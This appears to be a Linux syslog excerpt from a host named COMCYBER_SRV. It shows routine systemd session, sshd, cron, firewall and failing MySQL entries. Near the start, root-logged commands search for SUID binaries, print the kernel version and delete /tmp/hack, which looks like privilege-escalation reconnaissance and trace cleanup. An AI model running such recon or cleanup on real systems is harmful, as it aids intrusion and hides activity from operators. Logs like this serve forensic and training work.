+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Stopped target Paths.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Stopped target Sockets.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Stopped target Timers.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: dbus.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null) [0]
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(uname -a) [0]
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: dirmngr.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed GnuPG network certificate management daemon.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: gpg-agent.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Closed debconf communication socket.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Reached target Shutdown.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: systemd-exit.service: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Finished Exit the Session.
+Aug 27 12:38:59 COMCYBER_SRV systemd[496021]: Reached target Exit the Session.
+Aug 27 12:38:59 COMCYBER_SRV root[250822]: CMD(rm -rf /tmp/hack) [0]
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:38:59 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:38:59 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:39:00 COMCYBER_SRV systemd[1]: Starting Clean php session files...
+Aug 27 12:39:01 COMCYBER_SRV systemd[1]: phpsessionclean.service: Succeeded.
+Aug 27 12:39:01 COMCYBER_SRV systemd[1]: Finished Clean php session files.
+Aug 27 12:39:01 COMCYBER_SRV CRON[496478]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)
+Aug 27 12:40:03 COMCYBER_SRV sshd[497402]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:40:03 COMCYBER_SRV sshd[497402]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:40:03 COMCYBER_SRV sshd[497402]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:40:03 COMCYBER_SRV sshd[497402]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:40:03 COMCYBER_SRV sshd[497402]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:40:04 COMCYBER_SRV sshd[497443]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:40:04 COMCYBER_SRV sshd[497443]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:40:04 COMCYBER_SRV sshd[497443]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:40:04 COMCYBER_SRV sshd[497443]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:40:04 COMCYBER_SRV sshd[497443]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:40:53 COMCYBER_SRV kernel: [30920.336165] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=2001:0bc8:35b0:c166:0000:0000:0000:0151 DST=2001:0bc8:35b0:c166:0000:0000:0000:0152 LEN=80 TC=0 HOPLIMIT=64 FLOWLBL=102164 PROTO=TCP SPT=38368 DPT=2222 WINDOW=64800 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:53 COMCYBER_SRV kernel: [30920.694727] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=2001:0bc8:35b0:c166:0000:0000:0000:0151 DST=2001:0bc8:35b0:c166:0000:0000:0000:0152 LEN=80 TC=0 HOPLIMIT=64 FLOWLBL=897195 PROTO=TCP SPT=38378 DPT=2222 WINDOW=64800 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:54 COMCYBER_SRV kernel: [30921.367324] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=2001:0bc8:35b0:c166:0000:0000:0000:0151 DST=2001:0bc8:35b0:c166:0000:0000:0000:0152 LEN=80 TC=0 HOPLIMIT=64 FLOWLBL=492473 PROTO=TCP SPT=38368 DPT=2222 WINDOW=64800 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:54 COMCYBER_SRV kernel: [30921.367706] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=192.168.166.151 DST=192.168.166.152 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=62954 DF PROTO=TCP SPT=46110 DPT=2222 WINDOW=64240 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:54 COMCYBER_SRV kernel: [30921.723361] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=2001:0bc8:35b0:c166:0000:0000:0000:0151 DST=2001:0bc8:35b0:c166:0000:0000:0000:0152 LEN=80 TC=0 HOPLIMIT=64 FLOWLBL=826895 PROTO=TCP SPT=38378 DPT=2222 WINDOW=64800 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:54 COMCYBER_SRV kernel: [30921.723710] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=192.168.166.151 DST=192.168.166.152 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=4292 DF PROTO=TCP SPT=46118 DPT=2222 WINDOW=64240 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:55 COMCYBER_SRV kernel: [30922.391352] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=192.168.166.151 DST=192.168.166.152 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=62955 DF PROTO=TCP SPT=46110 DPT=2222 WINDOW=64240 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:40:55 COMCYBER_SRV kernel: [30922.747386] FW_OUTPUT_REJECT IN= OUT=eth0 SRC=192.168.166.151 DST=192.168.166.152 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=4293 DF PROTO=TCP SPT=46118 DPT=2222 WINDOW=64240 RES=0x00 SYN URGP=0 UID=1110 GID=1110
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:43:52 COMCYBER_SRV sshd[500254]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Reached target Paths.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Reached target Timers.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on debconf communication socket.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Reached target Sockets.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Reached target Basic System.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Reached target Main User Target.
+Aug 27 12:43:52 COMCYBER_SRV systemd[500267]: Startup finished in 210ms.
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: Started Session 1857 of user root.
+Aug 27 12:43:52 COMCYBER_SRV systemd[1]: session-1857.scope: Succeeded.
+Aug 27 12:43:59 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:43:59 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:43:59 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:44:00 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:44:00 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:44:00 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:44:01 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:44:01 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:44:01 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Stopped target Main User Target.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Stopped target Basic System.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Stopped target Paths.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Stopped target Sockets.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Stopped target Timers.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: dbus.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: dirmngr.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed GnuPG network certificate management daemon.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: gpg-agent.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Closed debconf communication socket.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Reached target Shutdown.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: systemd-exit.service: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Finished Exit the Session.
+Aug 27 12:44:02 COMCYBER_SRV systemd[500267]: Reached target Exit the Session.
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:44:02 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:45:02 COMCYBER_SRV CRON[501314]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Aug 27 12:45:03 COMCYBER_SRV sshd[501328]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:45:03 COMCYBER_SRV sshd[501328]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:45:03 COMCYBER_SRV sshd[501328]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:45:03 COMCYBER_SRV sshd[501328]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:45:03 COMCYBER_SRV sshd[501328]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:45:04 COMCYBER_SRV sshd[501350]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:45:04 COMCYBER_SRV sshd[501350]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:45:04 COMCYBER_SRV sshd[501350]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:45:04 COMCYBER_SRV sshd[501350]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:45:04 COMCYBER_SRV sshd[501350]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:48:54 COMCYBER_SRV sshd[504054]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:48:54 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:48:54 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:48:54 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:48:54 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Reached target Paths.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Reached target Timers.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on debconf communication socket.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Reached target Sockets.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Reached target Basic System.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Reached target Main User Target.
+Aug 27 12:48:54 COMCYBER_SRV systemd[504070]: Startup finished in 204ms.
+Aug 27 12:48:54 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:48:54 COMCYBER_SRV systemd[1]: Started Session 1875 of user root.
+Aug 27 12:48:55 COMCYBER_SRV systemd[1]: session-1875.scope: Succeeded.
+Aug 27 12:49:00 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:49:01 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:49:01 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:49:01 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:49:02 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:49:02 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:49:03 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:49:03 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:49:03 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: Stopping User Manager for UID 0...
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Stopped target Main User Target.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Stopped target Basic System.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Stopped target Paths.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Stopped target Sockets.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Stopped target Timers.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: dbus.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed D-Bus User Message Bus Socket.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: dirmngr.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed GnuPG network certificate management daemon.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: gpg-agent-browser.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: gpg-agent-extra.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: gpg-agent-ssh.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: gpg-agent.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: pk-debconf-helper.socket: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Closed debconf communication socket.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Reached target Shutdown.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: systemd-exit.service: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Finished Exit the Session.
+Aug 27 12:49:05 COMCYBER_SRV systemd[504070]: Reached target Exit the Session.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: user@0.service: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: Stopped User Manager for UID 0.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: Stopping User Runtime Directory /run/user/0...
+Aug 27 12:49:05 COMCYBER_SRV systemd[889]: run-user-0.mount: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: run-user-0.mount: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: user-runtime-dir@0.service: Succeeded.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: Stopped User Runtime Directory /run/user/0.
+Aug 27 12:49:05 COMCYBER_SRV systemd[1]: Removed slice User Slice of UID 0.
+Aug 27 12:50:03 COMCYBER_SRV sshd[505102]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:50:03 COMCYBER_SRV sshd[505102]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:50:03 COMCYBER_SRV sshd[505102]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:50:03 COMCYBER_SRV sshd[505102]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:50:03 COMCYBER_SRV sshd[505102]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:50:03 COMCYBER_SRV sshd[505113]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:50:03 COMCYBER_SRV sshd[505113]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:50:03 COMCYBER_SRV sshd[505113]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:50:03 COMCYBER_SRV sshd[505113]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:50:03 COMCYBER_SRV sshd[505113]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:53:49 COMCYBER_SRV sshd[508023]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:53:50 COMCYBER_SRV sshd[508023]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:53:50 COMCYBER_SRV sshd[508023]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:53:50 COMCYBER_SRV sshd[508023]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:53:50 COMCYBER_SRV sshd[508023]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:53:50 COMCYBER_SRV sshd[508023]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:53:50 COMCYBER_SRV sshd[508023]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:53:50 COMCYBER_SRV systemd[1]: Created slice User Slice of UID 0.
+Aug 27 12:53:50 COMCYBER_SRV systemd[1]: Starting User Runtime Directory /run/user/0...
+Aug 27 12:53:50 COMCYBER_SRV systemd[1]: Finished User Runtime Directory /run/user/0.
+Aug 27 12:53:50 COMCYBER_SRV systemd[1]: Starting User Manager for UID 0...
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Reached target Paths.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Reached target Timers.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Starting D-Bus User Message Bus Socket.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on GnuPG network certificate management daemon.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on GnuPG cryptographic agent and passphrase cache (restricted).
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on GnuPG cryptographic agent (ssh-agent emulation).
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on GnuPG cryptographic agent and passphrase cache.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on debconf communication socket.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Listening on D-Bus User Message Bus Socket.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Reached target Sockets.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Reached target Basic System.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Reached target Main User Target.
+Aug 27 12:53:50 COMCYBER_SRV systemd[508048]: Startup finished in 205ms.
+Aug 27 12:53:50 COMCYBER_SRV systemd[1]: Started User Manager for UID 0.
+Aug 27 12:53:50 COMCYBER_SRV systemd[1]: Started Session 1892 of user root.
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:53:57 COMCYBER_SRV sshd[508246]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:53:57 COMCYBER_SRV systemd[1]: Started Session 1894 of user root.
+Aug 27 12:53:57 COMCYBER_SRV systemd[1]: session-1894.scope: Succeeded.
+Aug 27 12:54:02 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:54:03 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:54:03 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:54:03 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:54:03 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:54:03 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:54:04 COMCYBER_SRV systemd[1]: Failed to start MySQL Server.
+Aug 27 12:54:04 COMCYBER_SRV systemd[1]: Stopped MySQL Server.
+Aug 27 12:54:04 COMCYBER_SRV systemd[1]: Starting MySQL Server...
+Aug 27 12:55:01 COMCYBER_SRV CRON[509097]: (root) CMD (command -v debian-sa1 > /dev/null && debian-sa1 1 1)
+Aug 27 12:55:03 COMCYBER_SRV sshd[509125]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:55:03 COMCYBER_SRV sshd[509125]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:55:03 COMCYBER_SRV sshd[509125]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:55:03 COMCYBER_SRV sshd[509125]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:55:03 COMCYBER_SRV sshd[509125]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:55:05 COMCYBER_SRV sshd[509166]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:55:05 COMCYBER_SRV sshd[509166]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:55:05 COMCYBER_SRV sshd[509166]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:55:05 COMCYBER_SRV sshd[509166]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:55:05 COMCYBER_SRV sshd[509166]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: rexec line 17: Deprecated option UsePrivilegeSeparation
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: rexec line 22: Deprecated option KeyRegenerationInterval
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: rexec line 23: Deprecated option ServerKeyBits
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: rexec line 39: Deprecated option RSAAuthentication
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: rexec line 46: Deprecated option RhostsRSAAuthentication
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: reprocess config line 39: Deprecated option RSAAuthentication
+Aug 27 12:59:00 COMCYBER_SRV sshd[512160]: reprocess config line 46: Deprecated option RhostsRSAAuthentication
